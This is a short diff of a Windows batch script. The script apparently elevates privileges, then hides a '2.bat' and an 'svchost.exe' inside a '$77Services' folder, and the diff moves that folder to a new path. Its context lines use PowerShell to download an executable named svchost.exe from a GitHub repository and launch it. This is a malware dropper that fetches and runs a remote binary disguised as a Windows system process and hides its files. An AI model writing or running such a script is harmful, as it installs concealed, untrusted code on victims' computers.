@@ -25,8 +25,8 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-cd C:\Users\%USERNAME%\AppData\Local\$77Services"
-attrib +h "C:\Users\%USERNAME%\AppData\Local\$77Services\2.bat" /s /d
-attrib +h "C:\Users\%USERNAME%\AppData\Local\$77Services\svchost.exe" /s /d
+cd C:\Users\%USERNAME%\$77Services"
+attrib +h "C:\Users\%USERNAME%\$77Services\2.bat" /s /d
+attrib +h "C:\Users\%USERNAME%\$77Services\svchost.exe" /s /d
 Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/svchost.exe/' -OutFile svchost.exe"
 start svchost.exe
